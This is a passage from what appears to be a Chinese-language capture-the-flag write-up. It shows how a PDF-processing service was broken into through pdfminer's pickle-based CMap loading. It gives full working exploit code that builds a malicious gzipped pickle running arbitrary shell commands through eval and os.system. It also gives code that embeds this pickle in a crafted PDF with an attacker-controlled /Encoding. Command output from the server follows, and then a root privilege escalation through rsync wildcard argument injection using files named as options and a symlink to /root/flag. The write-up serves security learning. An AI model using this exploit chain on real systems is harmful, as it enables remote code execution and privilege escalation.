关于提示1，**PDF本身支持内嵌文件**，后端`legacy_pdf.py`会把内嵌文件提取出来，前面返回JSON里的`embedded`字段就是在报告提取到的附件，于是在只传一个pdf的情况下既能控制其中的 `/Encoding` 字段又能传入恶意pickle，所以先尝试上传一个文件

### make_pickle.py

构造恶意pickle：

```python
#!/usr/bin/env python3

import gzip
import pickle

#伪装数据。服务端pdfminer加载完我们的pickle后，会把它当作一个CMap模块来用，会访问CODE2CID、IS_VERTICAL等四个属性。我们给上空的合法值，服务端的后续逻辑就不会报错
CMAP_MODULE = {
    "CODE2CID": {},
    "IS_VERTICAL": False,
    "CID2UNICHR_H": {},
    "CID2UNICHR_V": {},
}

#定义构造函数，参数cmd就是要在服务器上执行的系统命令字符串
def make_pickle_gz(cmd):
    expr = f"(__import__('os').system({cmd!r}), {CMAP_MODULE!r})[1]"

    class Test:
        def __reduce__(self):    #pickle协议的钩子
            return eval, (expr,)

    return gzip.compress(pickle.dumps(Test()))

#输入命令
cmd = input("请输入cmd: ")

#以二进制写模式创建文件
with open("test.pickle.gz", "wb") as f:
    f.write(make_pickle_gz(cmd))

print("test.pickle.gz written")
```

注意这里的核心在于`def __reduce__(self)`，详细解释一下：序列化对象时，pickle发现它有`__reduce__`，就不存对象的数据，改存它返回的`(callable, args)`二元组，语义是——**"重建这个对象时，请调用`callable(*args)`"**

总结来说：

`pickle` 不是普通的数据格式，它会记录“如何重新构造一个对象”。当对象被反序列化时，`pickle` 可以调用某个函数来重建对象。`__reduce__` 就是告诉 `pickle`：

```text
反序列化时，请调用 eval(expr)
```

而 `expr` 是这样构造的：

```python
expr = f"(__import__('os').system({cmd!r}), {CMAP_MODULE!r})[1]"
```

假设你输入：

```bash
id
```

那么大概会变成：

```python
(__import__('os').system('id'), {'CODE2CID': {}, 'IS_VERTICAL': False, ...})[1]
```

这个表达式利用了 Python 元组的求值顺序：

```python
(a, b)[1]
```

会先执行 `a`，再执行 `b`，最后返回第 2 个元素 `b`。

所以这里的执行流程是：

```python
__import__('os').system('id')
```

先执行命令，然后整个表达式返回：

```python
{
    "CODE2CID": {},
    "IS_VERTICAL": False,
    "CID2UNICHR_H": {},
    "CID2UNICHR_V": {},
}
```

也就是说，它既完成了命令执行，又让 `pickle.loads()` 的返回值看起来像一个正常的 pdfminer CMap 数据。

`gzip.compress(...)` 的作用只是把 pickle 数据再压缩一层，因为 pdfminer 的某些 CMap 缓存文件本来就是 `.pickle.gz` 格式。

### make_pdf.py

现在构造恶意pdf：

```python
#!/usr/bin/env python3

#读取make_pickle.py生成的test.pickle.gz，构造内嵌它的恶意PDF
with open("test.pickle.gz", "rb") as f:
    pickle_gz = f.read()

#页面绘制命令，必须真的用/F1画一次字，否则pdfminer不会加载这个字体
content = b"BT /F1 12 Tf 72 720 Td <0001> Tj ET"

objects = [
    #Catalog，声明本PDF有内嵌文件
    b"<< /Type /Catalog /Pages 2 0 R /Names << /EmbeddedFiles 8 0 R >> >>",

    #页面树
    b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",

    #页面，资源里声明/F1字体
    b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
    b"/Resources << /Font << /F1 4 0 R >> >> /Contents 7 0 R >>",

    #利用1: Type0字体，/Encoding是攻击者可控的CMap名
    b"<< /Type /Font /Subtype /Type0 /BaseFont /TestFont "
    b"/Encoding /test /DescendantFonts [5 0 R] >>",

    #正常的CIDFont和FontDescriptor，让字体结构合法
    b"<< /Type /Font /Subtype /CIDFontType2 /BaseFont /TestFont "
    b"/CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >> "
    b"/FontDescriptor 6 0 R /DW 1000 >>",

    b"<< /Type /FontDescriptor /FontName /TestFont /Flags 4 "
    b"/FontBBox [0 -200 1000 900] /ItalicAngle 0 "
    b"/Ascent 800 /Descent -200 /CapHeight 700 /StemV 80 >>",

    #页面内容流
    b"<< /Length " + str(len(content)).encode() + b" >>\nstream\n" + content + b"\nendstream",

    #利用2: 附件名称表，把文件名映射到9号对象
    b"<< /Names [(test.pickle.gz) 9 0 R] >>",

    #Filespec，相当于附件的"目录项"，/EF指向真正的数据流
    b"<< /Type /Filespec /F (test.pickle.gz) /UF (test.pickle.gz) "
    b"/EF << /F 10 0 R >> >>",

    #EmbeddedFile流，pickle.gz的原始字节
    b"<< /Type /EmbeddedFile /Length " + str(len(pickle_gz)).encode() +
    b" >>\nstream\n" + pickle_gz + b"\nendstream",
]

#拼接完整PDF: 文件头 + 对象们 + xref交叉引用表 + trailer
out = b"%PDF-1.4\n"
offsets = []
for i, obj in enumerate(objects, 1):
    offsets.append(len(out))
    out += f"{i} 0 obj\n".encode() + obj + b"\nendobj\n"

xref_pos = len(out)
out += f"xref\n0 {len(objects) + 1}\n".encode()
out += b"0000000000 65535 f \n"
for off in offsets:
    out += f"{off:010d} 00000 n \n".encode()

out += b"trailer\n"
out += f"<< /Size {len(objects) + 1} /Root 1 0 R >>\n".encode()
out += b"startxref\n" + str(xref_pos).encode() + b"\n%%EOF\n"

with open("test.pdf", "wb") as f:
    f.write(out)

print("test.pdf written")
```

## RCE

上传`ls /`后似乎直接就能有回显，不需要构造路径穿越：

```json
{"job":"5ddccd19987f43c18dc5e1dc22b5e3ab","returncode":0,"stderr":"","stdout":"app\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n{\"embedded\":[\"test.pickle.gz\"],\"encodings\":[\"test\"],\"loaded\":[\"test\"],\"missing\":[],\"pages\":1}\n"}
```

查`id`，发现是`uid=1000(app)`低权限用户

```json
{"job":"9f013ffb658645ec812b70e4ef18fbdd","returncode":0,"stderr":"","stdout":"uid=1000(app) gid=1000(app) groups=1000(app)\n{\"embedded\":[\"test.pickle.gz\"],\"encodings\":[\"test\"],\"loaded\":[\"test\"],\"missing\":[],\"pages\":1}\n"}
```

但还是先尝试直接找flag，`find / -iname "*flag*"`发现除了一些Linux 系统里本来就有的 “flags” 文件、前面传进来的一些失败payload外，有两个路径值得关注：`/app/data/stage/flag`和`/opt/pdf-archive/flag`，尝试发现cat第一个没权限：

```json
{"job":"47b1637b3a994a9b8b5ff5811f6f2a6f","returncode":0,"stderr":"cat: /app/data/stage/flag: Permission denied\n","stdout":"{\"embedded\":[\"test.pickle.gz\"],\"encodings\":[\"test\"],\"loaded\":[\"test\"],\"missing\":[],\"pages\":1}\n"}
```

第二个读取成功：

```json
{"job":"9acca34247584a2898b71f8dbbfafb6f","returncode":0,"stderr":"","stdout":"flag{legacy_cmap_pickle_to_root_archive_sync}\n{\"embedded\":[\"test.pickle.gz\"],\"encodings\":[\"test\"],\"loaded\":[\"test\"],\"missing\":[],\"pages\":1}\n"}
```

最终的flag：

```text
flag{legacy_cmap_pickle_to_root_archive_sync}
```

## 关于root_archive_sync

不过出于对flag内容`root_archive_sync`的好奇，我继续看了一眼`/app/data/stage/`目录

```text
-rw-r--r-- 1 app app 0 --chmod=ugo+r
-rw-r--r-- 1 app app 0 --copy-links
-rw-r--r-- 1 app app 0 --ignore-times
lrwxrwxrwx flag -> /root/flag
lrwxrwxrwx hostprobe -> /etc/hostname
```

这里`/app/data/stage/flag`是个指向`/root/flag`的软链，因此无权限cat，但是stage目录下却有三个有趣的文件：`--copy-links`、`--chmod=ugo+r`、`--ignore-times`

同时`/app/scripts/`目录下有个archive-sync：

```bash
#!/bin/sh
set -eu
cd /app/data/stage
/usr/bin/rsync -a * /opt/pdf-archive/
```

似乎就是关于flag的提权，了解到这是**通配符参数注入**，即`*`被shell展开后，这些以`--`开头的文件名被rsync当成**命令行选项**，实际执行等价于：

```bash
rsync -a --chmod=ugo+r --copy-links --ignore-times flag hostprobe /opt/pdf-archive/
```

- `--copy-links`：解引用软链，把`/root/flag`的**真实内容**复制过去
- `--chmod=ugo+r`：目标文件强制所有人可读（覆盖`/root/flag`原本的权限）
- `--ignore-times`：忽略时间戳强制重新同步

把当前目录下的 `flag` 和 `hostprobe` 复制到`/opt/pdf-archive/`，并让`/opt/pdf-archive/flag`能直接读取

后面了解到这一块其实是需要自己操作的，只不过由于容器是静态的，前面已经有人提权过了，所以才出了这些奇妙文件，复现一下预期解的流程应该为：

1. `sudo -l` 回显看到`(root) NOPASSWD: /usr/local/bin/archive-sync`确定可以免密以root跑归档脚本
2. `cat /usr/local/bin/archive-sync` 确定可以用`rsync通配符注入`
3. `cd /app/data/stage && touch ./--copy-links ./--chmod=ugo+r ./--ignore-times && ln -sf /root/flag ./flag && sudo /usr/local/bin/archive-sync` 在`/app/data/stage/`目录下创建 `--copy-links`、`--chmod=ugo+r`、`--ignore-times` 三个文件，创建一个名为 `./flag` 的软链接，指向 `/root/flag` ，以前面已知允许免密的root方式跑归档脚本
4. `cat /opt/pdf-archive/flag` 成功提权拿到flag

此外系统补充一下关于linux命令的知识：

`sudo`：

让普通用户**以其他身份（默认root）执行特定命令**，配置写在`/etc/sudoers`（及`/etc/sudoers.d/`）。设计初衷是最小授权：不给完整root shell，只放行明确允许的命令。
`sudo -l`则是**列出当前用户被允许执行的所有sudo规则**——纯查询不执行特权操作（`sudo -ln`免密尝试）

| 命令 | 是否允许询问密码 | 适用场景 |
| --- | --- | --- |
| `sudo -l` | 可以 | 正常终端、人工检查 |
| `sudo -ln` | 不可以 | 脚本、WebShell、无交互环境 |

`touch`：

```bash
touch a.txt        # a.txt不存在 → 创建空文件; 已存在 → 只更新mtime
#注意
touch --copy-links      # ✗ 报错: touch: 无法识别的选项 "--copy-links"
#解法，同时：-- 是POSIX约定的选项终止符，防御 rsync -a * 类漏洞的写法 rsync -a -- * /dest/ 用的就是它
touch ./--copy-links    # ① 加路径前缀, 名字不再以--开头
touch -- --copy-links   # ② 用 -- 显式告诉命令"后面都是参数不是选项"
```

`ln`：

```bash
ln 目标 硬链接名       # 硬链接
ln -s 目标 软链接名    # 软链接（符号链接, symbolic link）
#关于 -f（force）
ln -s target.txt mylink     # ✗ mylink已存在 → File exists (exit=1)
ln -sf target.txt mylink    # ✓ 先删旧的再建, 幂等
```

|  | 硬链接 | 软链接（`-s`） |
| --- | --- | --- |
| 本质 | 同一个文件的**第二个名字**（共享inode） | 一个**内容为路径字符串**的特殊小文件 |
| 目标不存在 | 创建不了（目标必须存在） | **可以创建**（指向不存在的路径也行，叫"悬空链接"） |
| 跨文件系统 | 不行 | 可以 |
| 指向目录 | 不行 | 可以 |
| 删目标后 | 链接照样能读（数据还在） | 链接失效 |
| `ls -l`长什么样 | 普通文件，链接数+1 | `lrwxrwxrwx 名字 -> 目标` |

## Flag

```text
flag{legacy_cmap_pickle_to_root_archive_sync}
```
